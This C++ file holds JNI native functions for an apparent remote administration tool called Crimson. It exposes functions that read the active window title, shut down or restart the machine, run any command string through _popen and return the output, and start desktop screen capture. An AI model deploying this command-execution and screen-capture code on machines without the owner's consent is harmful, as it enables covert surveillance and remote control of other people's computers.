#include "lapis.h"
#include "dxgi/DesktopDuplication.h"
#include "dxgi/JNIManager.h"

#pragma comment(lib, "wbemuuid.lib")

JNIEXPORT jstring JNICALL Java_com_subterranean_1security_crimson_core_util_Native_getActiveWindow(
		JNIEnv *env, jclass cls) {
	char title[256];
	GetWindowText(GetForegroundWindow(), title, sizeof(title));
	return env->NewStringUTF(title);
}

JNIEXPORT jlong JNICALL Java_com_subterranean_1security_crimson_core_util_Native_getSystemUptime(
		JNIEnv *env, jclass cls) {
	DWORD uptime = GetTickCount();
	return uptime;
}

JNIEXPORT jlong JNICALL Java_com_subterranean_1security_crimson_core_util_Native_getCpuTemp(
		JNIEnv *env, jclass cls) {

	return 0;
}

JNIEXPORT void JNICALL Java_com_subterranean_1security_crimson_core_util_Native_poweroff(JNIEnv *env, jclass cls) {
	system("shutdown /s /p");
}

JNIEXPORT void JNICALL Java_com_subterranean_1security_crimson_core_util_Native_restart(JNIEnv *env, jclass cls) {
	system("shutdown /r /p");
}

JNIEXPORT void JNICALL Java_com_subterranean_1security_crimson_core_util_Native_standby(JNIEnv *env, jclass cls) {

}

JNIEXPORT void JNICALL Java_com_subterranean_1security_crimson_core_util_Native_hibernate(JNIEnv *env, jclass cls) {
	system("shutdown /h /p");
}

//TODO move
std::string exec(const char* cmd) {
	char buffer[128];
	std::string result = "";
	std::shared_ptr < FILE > pipe(_popen(cmd, "r"), _pclose);
	if (!pipe)
		throw std::runtime_error("popen() failed!");
	while (!feof(pipe.get())) {
		if (fgets(buffer, 128, pipe.get()) != NULL)
			result += buffer;
	}
	return result;
}

JNIEXPORT jstring JNICALL Java_com_subterranean_1security_crimson_core_util_Native_execute(
		JNIEnv *env, jclass cls, jstring cmd) {

	return env->NewStringUTF(exec(env->GetStringUTFChars(cmd, NULL)).c_str());

}

JNIEXPORT void JNICALL Java_com_subterranean_1security_crimson_core_util_Native_startRD(JNIEnv *env, jclass jcls) {
	initJNIManager(env);

	//start RD
	startCapture();
}

JNIEXPORT void JNICALL Java_com_subterranean_1security_crimson_core_util_Native_stopRD(JNIEnv *env, jclass jcls) {

}

